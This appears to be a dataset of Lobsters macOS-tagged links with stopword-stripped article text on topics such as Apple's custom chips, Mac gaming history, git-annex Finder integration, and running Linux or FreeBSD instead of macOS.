324,Lobsters,mac,Apple macOS,Apple Plans to Ditch Intel and Use Custom Mac Chips Starting in 2020,https://www.macrumors.com/2018/04/02/apple-custom-mac-chips-2020/,apple plan ditch intel use custom mac chip starting,bloomberg io macos additional custom coprocessors chip chip armbased core processor chip,apple planning transition intel chip custom made mac chip early report bloomberg apple initiative reportedly code named kalamata part effort make mac iphones ipads work similarly seamlessly together according unspecified source spoke bloomberg apple already design aseries chip found iphones ipads mac chip plan said early stage development transition intel chip apple chip could involve multiple step starting marzipan initiative coming io macos allow developer create single app able run io macos chip apple would forced wait new intel chip able release updated mac company could integrate new feature faster schedule shift would also allow cupertino californiabased apple quickly bring new feature product differentiate competition using main chip would make apple major pc maker use processor dell technology inc hp inc lenovo group ltd asustek computer inc use intel chip using chip apple would able tightly integrate new hardware software potentially resulting system better battery life similar ipads use apple chip apple already begun using custom designed chip macbook pro imac pro machine company said planning integrate additional custom coprocessors mac coming later year custom chip also used upcoming mac pro development chip included macbook pro power touch bar authenticates touch id chip imac pro integrates several component including system management controller image signal processor ssd controller secure enclave hardwarebased encryption engine previous rumor suggested apple interested creating armbased core processor chip mac lineup order reduce dependence intel apple also rumored pursuing development modem chip also reduce reliance intel qualcomm move away intel would major impact intel apple providing approximately five percent intel annual revenue intel stock already dropped following news
325,Lobsters,mac,Apple macOS,Unified Logs in High Sierra (10.13) Show Plaintext Password for APFS Encrypted External Volumes via Disk Utility.app,http://www.mac4n6.com/blog/2018/3/21/uh-oh-unified-logs-in-high-sierra-1013-show-plaintext-password-for-apfs-encrypted-external-volumes-via-disk-utilityapp,unified log high sierra show plaintext password apfs encrypted external volume via disk utilityapp,update thanks ranvel screenshot applechinfo video testing also fixed,tried recreate scenario current system running unable therefore believe bug addressed however able recreate system image screenshot system tried system one easily available update blog someone test update thanks ranvel screenshot applechinfo video testing also fixed done much testing would like running course update deadline want get immediate used various investigation used following step recreate systemcreated clean flash drive formatted mac o extended journaled using disk utilityapp quick testing show base format work similarly kingston datatraveler drive labeled untitled
326,Lobsters,mac,Apple macOS,The Mac gaming console time has forgot,https://arstechnica.com/gaming/2018/03/the-mac-gaming-console-time-has-forgot/,mac gaming console time forgot,enlarge complicated wikimedia taken evan amos,enlarge nope xbox playstation even dreamcast apple reeling amidst declining mac sale microsoft gained stranglehold pc industry worse previous year apple spent million research development product laser printer powered speaker color monitor newton messagepad first device branded personal digital assistant pda little return yet come indeed looked likely come newton unreliable handwriting recognition quickly becoming butt joke adding turmoil engineering marketing team readying radical transition motorola also known family microprocessor powered mac since powerpc new powerful computer architecture jointly developed apple motorola ibm mac processor would nt able run software built powerpc similarly software built mac would need updated take advantage superior powerpc environment coo michael german engineer strategist climbed rank apple europe top layer executive elevated ceo previous ceo john sculley asked resign spindler spearheaded radical costheavy reorganisation company harmed morale increased chaos developed reputation horrendous people skill hold meeting ramble incoherently scribble illegible note whiteboard leave anybody could ask question office usually closed spindler rule apple became increasingly dysfunctional company lost focus direction one year board decided drop mac price raise market share next backflipped chased profit innovation disappeared product line embraced idea long abhorred internally sanctioning mac clone mac reached percent share personal computer market immediately begin decline pc outselling mac tentoone ticked percent following year apple board senior executive theorized allowing company manufacture macintosh hardware would somehow reverse apple could beat microsoft licensing game overturn massive market share deficit apple licensed mac system specialized us new nt compete apple mac sale eric sirkin director macintosh oem product new medium division brokered deal mac o used embedded dedicated specific function oem original equipment manufacturer product licensed resold part subsystem another company product clone program started nt interested doubted value company selling consumer mac stayed clear soon indirect channel sirkin got wind approach large japanese toy company called bandai make mac based game console territory newly formed personal interactive electronics pie division run former philip electronics vicepresident gaston bastiaens nt able capitalize opportunity sirkin recall frustrated people pie group sirkin already managing project firewire communication interface involved regular travel japan happy look pie group colleague connected bandai went japan discus idea founded son rice merchant bandai grown one largest toy manufacturer world made popular toy car toy licensee popular japanese child manga ultraman super robot gundam dragon ball digimon company making wave american market maker action figure toy hit new child superhero tv show mighty morphin power ranger based japanese show called super sentai bandai would generate million revenue sale power ranger merchandise u alone ceo makoto yamashina son founder wanted bandai actionfigure toy company however saw future global entertainment company like disney nintendo pushed year bandai produce animated film television serial delve deeper home electronics process drastically diversified product line made sweet bathroom product clothing video doll robot action figure video game older yamashina publicly lamented son business strategy bringing ten toy hope three would become hit bandai grown considerably stature revenue since yamashina taken idea would allow company take giant home entertainment bandai idea centered around cdrom surging popularity cd drive dropped price myst video game often first thing people bought many bandai license including dragon ball z power ranger sailor moon perfect game market bandai saw opportunity leverage property cd format together thereby conquer living room admired apple mac hoped partner cupertino company developing releasing game console multimedia machine better yet system could lowcost specialized mac could avoid problem facing similar limited software available complicated fell eric sirkin explain apple present state would likely willing able launch applebranded product charter create opportunity macintosh outside core market say strippeddown mac packaged living room multimedia system could fit charter proviso neither built sold apple sirkin explained apple could lead engineering design product charge persystem licence fee bandai manufacturing marketing branding would bandai responsibility liked idea went series meeting going back forth started involving satjiv chahil bos also raised attention ian diery head apple personal computer division visibility seen activity costing company lot money possibly opportunity reposition technology company another market apple bandai soon entered agreement sirkin returned cupertino put team engineer onto project help design device internals codenamed project pippin type apple name already registered apple nt used yet core technology would come new powerpc line keep cost opted lowend powerpc rather powerful much expensive processor pippin would lowcost macintosh designed living room clone different name different purpose immediately thing got complicated sirkin team instructed apple management make system unmaclike pippin could allowed cannibalize desktop mac sale limited people could nt possibly use primary personal computer distancing mac affected pippin number way first apple deemed important device manufactured branded bandai product bandai people would loved apple go make recall richard sprague acted intermediary interpreter apple bandai felt like manufacturing price pay get applecompatible medium device apple business people believed real money computer business came software problem software people copy argue going put best copy protection humankind ever known going make thing locked impossible play anything stuff put sprague say led illadvised mathematics spurred illadvised policy would nice machine take copy myst shelf work pc work mac pop pippin play would kind cool make myst developer would make special version disc u whole bunch thing like ensuring nobody would ever mistake macintosh sprague hired apple help recruit japanese software company write software mac day apple really growing quickly japan recall every perspective looked like japanese going dominate world kind thing kind hot special place sprague also fluent japanese speaker often play role interpreter visiting apple executive one day got dragged along super topsecret meeting new medium division head satjiv chahil bandai top executive including company president makoto yamashina somewhere middle meeting turned bandai really mad apple sprague recall yamashina like polite kind mean japanese talking apple screwed signed agreement month ago apple nt done single thing apple supposed put fulltime employee japan work bandai satjiv without batting eye say well hire fulltime person brought richard sprague told translate like satjiv already got job dragged along asked go play along tell make later lot pippin run exactly way kinda making thing go apple increasing managerial dysfunction took immediate toll pippin project went kind struggle engineering team sirkin recall one point four key software engineer went strike said could nt deliver product schedule committed decided nt want work anymore working like six month sirkin continues ended fire place assigned group software engineer group willing work overtime get project back schedule listing image wikimedia taken evan amos
327,Lobsters,mac,Apple macOS,The making of Dark Castle,https://www.gamasutra.com/view/news/315720/The_making_of_Dark_Castle_An_excerpt_from_The_Secret_History_of_Mac_Gaming.php,making dark castle,secret history mac gaming website,follows chapter secret history mac gaming new book written gamasutra contributor richard moss chapter moss chart origin impact silicon beach software seminal game dark castle charlie jackson dream play sport united state national team sport nt matter much long could team dream came college two rowing teammate made different united state team one world university game world championship jackson skilled soccer athletics rowing could see nt going attain level needed compete internationally find another sport answer came four year active service united state marine corp communication officer also took competitive rifle pistol shooting within year good enough make marine corp team represented regional national championship jackson continued shooting competitively marine service split time running technologycentric business competing marine corp reserve team later likened getting paid pro golf circuit everything needed competition provided kind shooting marine corp reserve different one done internationally event like olympics however order get good enough compete internationally style knew train fulltime year two needed money come january macintosh officially introduced jackson running computer training business taught people use apple ii ibmpc machine early adopter platform seen little software available beginning also seen early adopter desperate buy software exciting expensive new gadget buy almost anything gave reason spend time using computer jackson knew would happen macintosh new software company could grow quickly could get early entrepreneur businessman could nt write code order find right people people excited mac knew program computer logged onto online newsgroup announced first san diego macintosh user group meeting hosted house thirtyfive people crammed upstairs office chat revolutionary new personal computer meeting man walked jackson proudly introduced son jonathan california school science fair award programming graphic editor apple ii oh really think interested programming macintosh jackson asked sure would eric zocher also stayed back end meeting computer science student university california san diego ucsd seen lisa spent lot time minicomputer mainframe university computing centre zocher never owned personal computer listened excitedly rumor mac back eager finally try jackson told wanted start software company programmer zocher blurted want work like zocher quickly discovered programming macintosh using official apple development tool required lisa brought additional cost thousand one discouraged jackson withdrew life saving bought lisa signed apple developer program founded company silicon beach software met seventeenyearold jonathan gay made deal gay would nt get money front get royalty sale macintosh game program weekend jackson handed unlimited access lisa without second thought due diligence programming test trusted thing would work best jonathan gay turned good programmer charlie jackson keep sooner would give teenager new task done matter week game began take shape airborne would repelling onrushing military airborne force armed antiaircraft gun mortar mounted behind light fortification player needed move mouse angle shot destroy endless wave tank soldier parachuted onto screen shoot jet helicopter cargo plane flew overhead pressing space bar would switch two weapon command would make antiaircraft shell steerable mouse long started talking game startup screen wanted picture would capture mood spark player imagination jackson suggested airborne trooper wearing beret soldier could snap salute say airborne sir like real trooper would passing officer jackson noticed apple ii game used programmed square wave make surprisingly sophisticated sound even point mimicking human voice hoped macintosh could eric zocher began investigate looked inside macintosh manual found fourvoice synthesizer would play square wave simple waveform could make beep boops sound like home computer time like charlie jackson wanted zocher idea figure amplitude frequency square wave could combine make something sound like explosion let alone voice thought try recording sound like recreate square wave get onto minicomputer university look way programmatically approximate waveform correspond recorded sound researched however realized mac could already play recorded sound another builtin sound driver one could play sampled digital sound one time could somehow get sample onto mac nobody tried charlie jackson graduate study linguistics ucsd friend phonetics lab using audio digitizing equipment study human vocal tract identify mechanic people speak pair took zocher cassette recording lab zocher wrote utility program shrink sampling rate number sample snapshot audio carried per second adjust bit depth audio resolution bit bit used baud modem acoustic coupler transfer file mac zocher played using little program written tap sound driver jaw dropped amazing one ever heard anything like come computer zocher recall bit tinny little macintosh speaker nt bad speaker mac faithful never heard basically digital audio coming mac like oh god could game way could music sound game way zocher put together simple audio wave editor mac would allow test refine various sound effect music devoted music fan recorded sample collection vinyl album jackson picked record believed copyright symphonic recording sound effect record early whittled sample process trial error thing sounded bad mac others long nt match well game animation sixteen kilobyte remaining disk audio accounting rest game gay coded assembly language maximum efficiency sound brief loop used wherever possible example helicopter go wopwopwopwop could stored sample wop game repeat got dozen sound game way zocher even figured way play two sound simultaneously dynamically mixing together one signal one problem mac speaker would pop loudly every sound always nt oscilloscope figure zocher got jackson grunt work using wave editor jackson would hold shift key click add one byte sound file test zocher kept track pop occurred nt remember one point calculator jackson say go got sound buffer full macintosh sound generator converted entire sound buffer last byte audio set interval macintosh screen refreshed sixty time second time vertical retrace interrupt would run interrupt served specific important purpose allowed retrace beam draw graphic across screen one line time left right top bottom return top left corner ready redraw graphic needed fill sound buffer completely also time sound buffer update synchronize precisely beam else get audio flickering form popping sound every sixtieth second interrupt new improved sound driver would look two highestpriority sound mix together fill sound buffer worked charm first macworld expo came early week finished game strapped cash trio packed gear folding table jackson brother beatup old volkswagen camper drove san diego san francisco show airborne little threebythreemeter booth space basement moscone center hooked mac zocher huge waisthigh stereo speaker booted airborne crowd play luck would booth bottom ramp coming show floor everybody arrived would hear airborne sound music opening bar richard wagner famous composition ride valkyrie airborne drew lot positive attention buzz across three day show including much macintosh team curious silicon beach crew got sound work independent retailer scoured floor exciting new software collectively ordered hundred copy store jackson took third mortgage house pay mass production airborne box advertisement macworld magazine shipping distributor retailer first month happened house airborne successful enough establish silicon beach software reputation mac software scene pay office plus fulltime salary couple staff company soon expanded productivity software desk accessory collection accessory pak label printing utility silicon press also published bill appleton world builder game authoring software one four game enchanted scepter planned use showcase world builder technology sale enchanted scepter nt good enough justify development three next inhouse game jackson wanted get real designer involved done okay airborne knew limit talent case company position felt like bring somebody know stuff somebody experienced could think guy mark stephen pierce entered school art institute chicago one america top art school fourteen talented illustrator really loved play around computer found one school lab computer could nt display graphic fill entire screen one type text character change character certain place make simple animation year two later school got graphic computer called zbox used chipset bally astrocade home video game console renowned impressive graphic capability pierce loved draw graphic astrocade use program written bally basic allowed trigger gun controller act like pen could draw pointing gun tv cool zbox sophisticated multiple framebuffers could store screenfull graphic meant could quickly flip create animation like drawing flipbook come night nobody else using machine work morning one point created animation albert einstein eye blinking mouth talking semester finished zbox creator tom defanti returned school see student created defanti impressed pierce work offered job pierce paid hour make animation graphic could use impress company investor attendee industry event like consumer electronics show siggraph creation earned great acclaim new job began working dave nutting associate consulting firm made coinoperated game bally manufacturing corporation tasked animating multiplechoice question arcade game called professor pacman started hanging two colleague marc canter met art school jay fenton jamie fenton canter working audio company fenton designed popular arcade game called gorf created three tool help work one painting another animation audio mac horizon thought cool idea commercial version tool quit job founded macromind developed musicworks audio videoworks animation pierce loved play around videoworks could draw like man possessed twelve hour straight somehow energy party night satisfying work could begin day nothing finish animation guy run left right jump hoop catch fire explodes immediacy like nothing else whereas traditional animation required drawing paper taking picture getting film developed edited computer animation tool like videoworks could happen second macromind software gained traction money keep company afloat canter fatherinlaw made investment yet aware investment business work pierce outraged investment dilute share company quit huff zocher seen pierce sample animation still image disk manual videoworks could nt believe good drawing mouse like drawing pack cigarette pierce somehow mastered inelegant yet powerful brush macworld magazine time would showcase illustration done professional artist macpaint amazing pierce work another level keen work nowindependent artist animator charlie jackson flew pierce chicago san diego talk new game drive airport house explained idea platform game guy modern weapon would walk portal end every level next world would totally different zocher got idea shortlived tv show family stumbled portal military board game called timetripper involved pitting modern soldier foe across age dinosaur roman gladiator future spaceman pierce thought stupid incoherent instead said gon na fit sudden creative inspiration pierce drew storyboard whole game called dark castle would quest evil black knight defeated surviving series trial obtaining magic shield power hurl fireball told piece piece approximately game would work silicon beach people attendance eric zocher charlie jackson charlie jackson wife jonathan gay objection talked way pierce expert anything impressed five plus tenyearold son one jackson friend spent rest afternoon sitting around whiteboard fleshing story brainstorming idea detail specific room weapon pierce flew back chicago next day started working game draw artwork superpaint silicon beach upcoming paint program make animation videoworks physically mail floppy disk jonathan gay excited receive pierce artwork gay would incorporate animation design fragment code send back build game pierce try went back forth four month initially wait day time disk traversed kilometer around mile san diego chicago regular mail partway development federal express mail service expanded include express parceltracked shipping respective city suddenly could send floppy across country overnight vision game living interactive animation story reminiscent saturday morning cartoon serviced typical hallmark good cartoon smooth sharp completely flickerfree animation thanks gay assembly code documented unsupported hardware hack moody detailed background clumsy idiot hero main character unnamed game dubbed prince duncan blurb back box could run jump throw rock easily enough also clumsier shaggy scooby doo could manage avoid bitten bat rat crow taken crossbow arrow baddie still liable die comical fashion courtesy evil halfstep pierce took inspiration many level favorite arcade game one room shield recalled latenight game donkey kong neo club chicago beginning another level designed vulture would gather grid formation swoop like alien ship galaga game soon looked part blackandwhite interactive cartoon needed sound like one zocher already list sound wanted jackson introduced semiretired seventyoneyearold voiceover artist called dick noel pronounced noel noel beta testing label printing utility silicon press little studio set house used record bit radio advertising cartoon height career juggled multiple advertising radio television announcer job voiced fred flintstone pilot episode longrunning cartoon flintstone soon jackson found asked noel help zocher took early build dark castle noel house show character animation noel needed little direction look animation come possible voice characterization crow would fly formation swoop one another suggested schmackschmack sound vowel drawn instance stubby little mutant leg arm sticking head said nyehnyehnyehnyehnyeh hour two tape full recording potential voice every character game except guy chained dungeon hit masked henchman wielding whip jackson sound invented new game development role voiceover artist noel would included game credit title voice characterization zocher digitized sound refined wave edit program fit constraint macintosh plus model original would supported time also developed version custom sound driver could play compressed sound file dark castle seventytwo sound including noel voice characterization lightning strike opening chord bach toccata fugue minor game title screen variety environmental sound effect running water recorded sink toilet clinking chain recorded dropping little metal ring lock leg foldup table sound became integral experience lent malice vulture persistent annoyance mutant rat bat magic broom tinman guard gave world life showed hero goofball player guided wall spin around dazed star flying around head like cartoon mumbled incoherently second stopped theatrical brrrr intonation shook likewise ran ledge stop midair look look exclaim whooaaoh fell phenomenon zocher coined road runner physic dark castle released late great acclaim regular column called role computer tabletop roleplaying game magazine dragon patricia lesser commended dark castle finest arcadeadventure game ever designed computer special praise fast action stunning graphic animation digitized sound reviewer technology magazine byte computer gaming world le gushing praise dark castle also game year award big macintosh magazine macworld macuser beginning sale copy rising rate thousand every month would great staying power thirtynine month dark castle finally dropped macworld list top five bestselling mac entertainment program beginning sequel beyond dark castle would rank top five twentyone time chart including final month chart published may gay share royalty high enough cover entire college tuition pierce gay silicon beach software whole hailed hero among rock star little macintosh world dark castle moved needle advanced imaginings computer could video game could aside landmark control scheme w key controlled movement mouse took care aiming shooting standard today wider influence would limited however played mac do apple iigs sega mega drive amiga commodore philip cdi atari st msx version would follow next several year none caused much stir poor timing limited marketing others minor imperfection marred overall experience made harder justify effort beating one difficult game era best known port do mega drive version actually dark castle great disservice offered garish blocky color rendition pierce detailed handdrawn blackandwhite artwork paired inferior animation engine awkward slow gamepad keyboardonly control setup muddied precise idiosyncratic mouse keyboard control mac original sequel little series fame beyond home platform beyond dark castle made predecessor seem easy gay pierce dialed speed intensity level level could mastered repetition title suggested beyond dark castle let skilled player explore farther wider additional castle chamber well rich outer world containing swampland forest wall scamper labyrinth master highlight leonardo da vinciworthy helicopter gizmo could wrap around prince duncan star proceeding allow fly across level scrolled vertically horizontally rather horizontally many area new toy larger space aside beyond dark castle made sport killing player every opportunity original cast baddie added enemy including venomous snake giant mosquito pulsating laser beam used make player life miserable excuse though addition new version dungeon level game sent player fell got dropped floor gargoyle beyond dark castle included save mechanism player return special room pull one several lever order save progress still could save macworld reviewer ralph ames called beyond dark castle best computer game ever played citing highlight unrivaled presentation way openended level design blended arcade game graphic adventure game beyond dark castle last time gay pierce worked together however would also silicon beach software last game reality graphic software like superpaint supercard digital darkroom super earned company considerably money necessarily sold better superpaint outsold dark castle game sold considerably money simple economics hit product sold copy much profitable one sold copy decision leave game behind made simpler fact game development getting complicated already game team growing one two people could still make hit game getting harder graphical fidelity design depth expected market took ever greater resource jackson nt think silicon beach could get worthwhile return increased investment switched company focus wholly graphic software utility two year later february jackson sold company aldus corporation exactly amount needed order train international style rapidfire pistol shooting fulltime year later started training middle fortythree year age made u team charlie jackson gone full circle returned software business except new silicon beach software make window rather mac multimedia drawing apps eric zocher director user experience microsoft jonathan gay note went create flash multimedia software owns familyoperated cattle ranch mark pierce owns game company called super happy fun fun hope one day make new dark castle game chapter secret history mac gaming richard moss reprinted author permission enjoyed good news book available digital print edition find detail book website
328,Lobsters,mac,Apple macOS,Apple Finder integration for git-annex,https://github.com/andrewringler/git-annex-turtle,apple finder integration gitannex,gitannexturtle download gitannexturtle apple finder gitannex mit license otherlicensestxt getting started install signup update download gitannex walkthrough download gitannexturtle stable beta release requires unstable release usage feature badge contextual menu menubar icon badge file gitannex copy folder example requirement liferay nativity related software issue important directory git config name tortoisecvs building build release,gitannexturtle download gitannexturtle gitannexturtle provides apple finder integration gitannex macos including custom badge icon badge contextual menu controlclicks menubar icon aka menubar extra gitannexturtle native mac app written swift xcode requires macos later gitannexturtle free opensource licensed mit license gitannexturtle includes software creative worksassets licensed open source license see otherlicensestxt information getting started install signup update receive email new version release infrequent announcement download gitannex macos install application folder follow gitannex walkthrough never used gitannex download gitannexturtle stable beta release unzip drag application application folder requires macos later need bleeding edge feature try unstable release usage click gitannexturtle menubar icon click click add new gitannex repository watch gitannexturtle perform initial full scan repository added full scan required may cache status information folder since filelevel status stored git gitannex view gitannex repository apple finder see updated badge icon right click controlclick file folder see gitannex specific context menu badge icon appear progressively full scan completes feature badge gitannexturtle add badge icon badge every file folder monitored gitannex repository indicating presentabsent status number copy whether copy lacking contextual menu gitannexturtle add contextual menu controlclicks file folder monitored repos allowing quick access gitannex getdropadd menubar icon gitannexturtle add menubar icon aka menubar extra showing animated activity status monitored folder status preference menu badge file badge signify present absent number copy whether desired number gitannex copy numcopies present absent status signified filled solid v notfilled empty square number copy signified digit ranging star file copy file least amount copy specified numcopies setting gitattributes override icon colored green otherwise red folder badge signify status file contained within signify file present present absent file present icon solid square file absent icon empty square otherwise file present icon partially filed square icon digit signifies number copy file least copy contained within every file contained within folder least desired number copy icon colored green otherwise red example icon description present file copy desired number copy folder containing present file copy file desired number copy present file copy folder containing present file copy file desired number copy file copy present folder containing absent file copy file copy present desired number copy folder containing absent file copy desired number copy folder containing least copy file present absent file desired number copy folder containing present absent file copy least desired number copy present file copy le desired number copy folder containing present file copy one file le desired number copy present file copy le desired number copy folder containing present file copy one file le desired number copy file copy present le desired number copy folder containing absent file copy one le desired number copy file copy present le desired number copy folder containing absent file copy one le desired number copy folder containing present absent file copy one le desired number copy folder containing present absent file copy one le desired number copy file known copy implies present folder containing absent file one known copy empty folder folder containing nonannexed file empty folder file scanned successfully state yet handled gitannexturtle requirement macos later gitannexturtle relies apple finder sync api available osx yosemite later version macos liferay nativity library could potentially used enable gitannexturtle run older mac os also using feature coredata available macos later gitannexturtle released mac written swift xcode probably easily portable linux window may course adapt use app user experience design workflow icon set porting os see gitannex related software option already built os issue apple finder sync extension allows one extension register per folder apps might conflicting gitannexturtle example dropbox register finder sync extension entire home folder usersyourname regardless actual dropbox folder located dropbox apparently move dropbox context menu every single file launch system preference extension finder see apps finder sync extension registered want continue using dropbox partially disable finder integration preference menu cloud syncing still continue operate important directory librarygroup containersgroupcomandrewringlergitannexmacsharedgroup app group location sqlite database may safely delete folder app extension process running full scan restart next launch gitannexturtle configgitannexturtlemonitor store config setting gitannexturtle editable menubar icon editing file directly us git config style syntax may safely update file manually app detect change note adding removing repos via gui clobber comment unknown line added manually file name gitannexturtle take inspiration function name tortoisecvs many tool provided oslevel filesystem icon source revision control software building install xcode install xcode sdk macos xcode open srcgitannexturtlexcodeproj xcode create new scheme called gitannexturtle build target gitannexturtle gitannexturtletests run gitannexturtle scheme build release clone gitannexturtle repo run buildrelease script cd gitannexturtle buildlocalreleasesh release
329,Lobsters,mac,Apple macOS,A Year Away From Mac OS,http://bitcannon.net/post/a-year-away-from-mac-os/,year away mac o,finding alternative mac o x january linux thing elementary o arch linux budgie gnome desktop environment work pc february settling gnome albert plank april new job found thinkpad pretty lacklustre gross dongle filco tkl three year old hardware august new laptop bought first nonapple personal laptop rust magsafe dell xps power connector embedded white led october freebsd desktop zfs official driver freebsd freebsd desktop howto update enpass pas gpg browser extension io client imported stardew valley recent progress running stardew valley openbsd march window eve v wesonwindows read rust cobalt scoop general observation missing apps moneywell update march bucket gnome notification wrap twitter http alvalinkpostreclaimyourabandonware void give back little number package arch user repository subscribe feed twitter mastodon supporting github sponsor read part,fifth post series finding alternative mac o x bit year ago wrote search alternative mac o switch linux post reflect year went detail adventure mac o alternative january linux thing originally choosing use elementary o full time grew frustrated aspect system switched arch linux bit time budgie eventually settled gnome desktop environment experiment going well also installed arch mac mini macbook pro addition work pc used primary o february settling gnome installed tool like albert plank gnome extension custom theme feel home gnome following month gave got comfortable environment run vanilla gnome desktop experience gnome extension mostly bad many tried suffered one issue memory leak flakiness broke gnomeshell generally low quality question choice building significant part shell javascript april new job april started new job given choice thinkpad macbook pro chose thinkpad run arch gnome found thinkpad pretty lacklustre run linux well devs work running linux devs macbooks mostly macbook one without touch bar two usbc port feeling modern macbooks reinforced seeing machine use daily basis macbook issued gross dongle connect external display use provide least one usba port usb port juggled external keyboard mouse dongle phone charger occasionally usb hard drive time shortage dongle melbourne people tried nonapple one proved flakey caused system instability apple choice fully embrace usbc completely ignored people actually need computer estimate macbooks office many people choose use crappy company supplied logitech keyboard macbook personally purchased filco tkl seen sort failure rate mentioned elsewhere still seen couple macbook keyboard fail short life one key become sticky unreliable space fall starting new job also meant chunky work pc came home replacing mac mini later sold mini price paid year ago one quad core one make go show people want machine whatever reason apple happy selling three year old hardware brand new price august new laptop august gained confidence switch going stick bought first nonapple personal laptop dell xps xps proven reliable wellbuilt fast screen continues impress top still manages hour battery life xps beast quad core ram ssd display discrete graphic fairly heavy laptop love choice thicker heavier machine want better battery life larger screen port forced compromise thinness lightness regularly work rust powerful machine compiling really helpful thing dislike xps probably power connector miss ease attachment feedback magsafe dell power connector barrel style connector led embedded led appears serve useful purpose always whether connected change colour turn charged dell xps power connector embedded white led october freebsd desktop continued lured bsd desktop stable base rolling package model system appealing prefer bsd style licensing flexibility guarantee zfs provides installed freebsd alongside arch xps laptop support wifi graphic power efficiency seems quite bit behind linux eventually realised could try running desktop pc component wellsupported including nvidia graphic card nvidia actually release official driver freebsd zfs like use whole disk one benefit generic desktop hardware upgradable invested trio samsung ssds added system installed freebsd zpool status pool zroot state online scan none requested config name state read write cksum zroot online online online online online error known data error df h filesystem size used avail capacity mounted zrootrootdefault freebsd desktop howto allison nicole reid proved especially helpful configuring system desktop use usual went gnome desktop unfortunately freebsd version gnome stuck two year old version part issue although miss improvement subsequent release fortunately version good hidpi support using display update october gnome freebsd port updated bringing two year development upgrade seamless working perfectly one hurdle using freebsd password management password manager using enpass support freebsd research settled pas replacement elegant solution password management tree file encrypted gpg shell script manage browser extension io client actual use surprisingly userfriendly imported password pas able access freebsd bonus password manager open source data selfhosted tracked git even various setting tweaked desktop freebsd experience seamless linux example starting gnome session gnomekeyringdaemon start appear called called desired effect run manually set agent environment variable also unable eliminate screen tearing firefox scrolling poked various setting remains initially missed playing game stardew valley freebsd consuming hour time week prior freebsd install extra friction rebooting arch run game basically stopped playing entirely bad thing recent progress running stardew valley openbsd could look porting enough side project though lesser degree also missed dropbox freebsd heavy dropbox user get dropbox website absence minor annoyance would nice freebsd version available march window january wrote regarding window say strongly biased towards nix style operating system find unlikely happy using window full time however interest keeping open mind give try next month backed eve v campaign eve v laptop tablet come window window table took lot longer expected v finally arrived february backed campaign december getting feel window machine pen offer still see making window primary o keep exploring tweeting adventure wesonwindows hash tag point attempt installing linux initial goal able replicate workflow updating read rust window feel like reasonable sample determine use window get real work done us following tool ssh git rust cobalt static site compiler makefile ruby little date script aws command line tool yet tried installing aws tool rest working powershell without window subsystem linux wsl tool installed scoop post v window future general observation missing apps october wrote migration away mac o x still going well rarely use mac o one remaining application yet find suitable replacement moneywell still case month open macbook balance finance track budget looked many alternative none nonweb based option could find envelope budgeting automatic distribution fund envelope based spending plan update march discovered bucket trialling moneywell replacement gnome opinion gnome desktop environment good mac o level polished part work well consistent cohesive uncluttered unobtrusive release made every month always improving however vein yyyy year linux desktop bit perpetual feeling next gnome release solve gripe part year eagerly awaiting release brought per display resolution setting allowing display used together ability adjust split position two window tiled next feature arrived suppose attention drawn thing getting never quite feel feature complete always feeling waitinglooking forward next release notification like notification handling gnome notification appear centred top screen super annoying assume slide make room subsequent notification filling middle screen instead replace current notification almost notification seem transient show notification panel several show quick succession see recent one mac o handle notification lot better wrap point see switching back mac o one task moneywell able achieve new linux freebsd system hopeful eventually able move one area using tool found suitable replacement twitter mar wezm omg happening immediate reaction interesting open source super cool post get abandoned mac twitter client support character tweet modifying assembly http alvalinkpostreclaimyourabandonware year think value operating system shifted went valuing design consistency attention detail definitely still value thing think softened willing settle rough edge return get system always date hardware option upgradeable hardware ability build environment work freedom study program work change computing wish last one come bit surprise always fan open source happy use wellmade proprietary software turn huge portion system open source perspective change jumping hoop install proprietary software system package repos kind drag feel sort wrong system also something wonderful public bug tracker search track progress issue instead submitting void say thanks wonderful software using free tried give back little financially code documentation contribution also maintain number package arch user repository hope submit first freebsd port distant future thanks following journey happy computing subscribe feed follow twitter mastodon update enjoyed post consider supporting github sponsor part series read part
330,Lobsters,mac,Apple macOS,Running Linux on a modern MacBook Pro,https://penguindreams.org/blog/linux-on-a-macbook-pro-14-3,running linux modern macbook pro,project github partitioning booting keyboard mouse fork macbook spi kernel module adapted misread instruction bluetooth bluetooth issue github project display power conclusion getting hardware working msi laptop,macbook pro running gentoo linux since last three job held software engineer always used linux natively work desktop laptop company choice one mandatory development shop give engineer option either window pc mac upon hiring however recent shop considered simply running linux virtual machine however virtualbox proved slow unusable efi booting issue demo vmware fusion probably could worked issue instead decided take leap attempt dual boot linux natively considerably amount work done open source community get modern apple hardware working linux much documented project github able leverage quite bit work get mostly working development environment although thing still broken confident work issue hope post help engineer want use modern macbook pro powerful linux development machine partitioning barely anything macos partition fresh laptop decided go shrinking small possible macos partition proceeded boot linux livecd format new empty partition luks encryption container within container created logical volume root partition swap go detail particular layout partition setup vary person person however say boot folder encrypted volume relied builtin luks module decrypt partition load linux kernel disk utility partition resizing device start end sector size type efi system unknown linux filesystem apple boot booting luks encrypted disk prompt surprised discover macbooks seem secure boot enabled pretty trivial simply plug usb flash drive containing ubuntu live cd image hold alt key bootup process see uefi boot option usb stick setup installed gentoo linux image used ubuntu installation medium since supported uefi minimal usb medium gentoo live cd support uefi time writing pretty old wanted best shot apple driverhardware support booting came first challenge keyboard mouse almost modern day machine whether arm laptop input device typically keyboard touchpad almost always attached internally universal serial bus usb except apple modern laptop decided attach input device new fancy touch bar serial peripheral interface spi bus luckily fork macbook spi kernel module adapted enable keyboard touchpad touchbar current generation macbooks module work following kernel option must enabled menuconfig device driver spi support configspiy menuconfig device driver multifunction device driver intel low power subsystem support pci mode configmfdintellpsspciy misread instruction realize needed enable lp option listed well without touchbar operational keyboard touchpad bluetooth bluetooth macbooks serial bus using broadcom protocol specifically configbthciuartbcm kernel option must enabled first appeared mainline kernel starting version might difficult get option show make menucofnig several dependency must enabled right order menuconfig device driver gpio support configgpioliby menuconfig device driver character device serial driver support serial port intel lp platform menuconfig device driver character device serial driver support synopsys designware quirk menuconfig device driver character device serial device bus configserialdevbusy menuconfig device driver character device serial device bus serial device tty port controller configserialdevctrlttyporty enabled serialdevbus bthciuart configbthciuartserdevy menuconfig networking support bluetooth subsystem support bluetooth device driver broadcom protocol support configbthciuartbcmy option enabled vanilla kernel bluetooth worked right box getting particular bluetooth adapter working mac started year ago recent fix committed released mainline linux tree le month attempt many problem encountered debugging attempted involved reading bluetooth issue github project first encounter audio sync stuttering issue documented issue using headphone time get real stuttering start get sync issue delay second working office use bluetooth listening music mouse noticeable mouse lag audio delay acceptable limited use case music immersion display display one puzzling issue worked box using open source amdgpu driver however usbc connected monitor simply display anything connected started attempted initialize external display xrandr screen refused turn nothing appearing xorg log switching virtual console via back occasionally would cause monitor 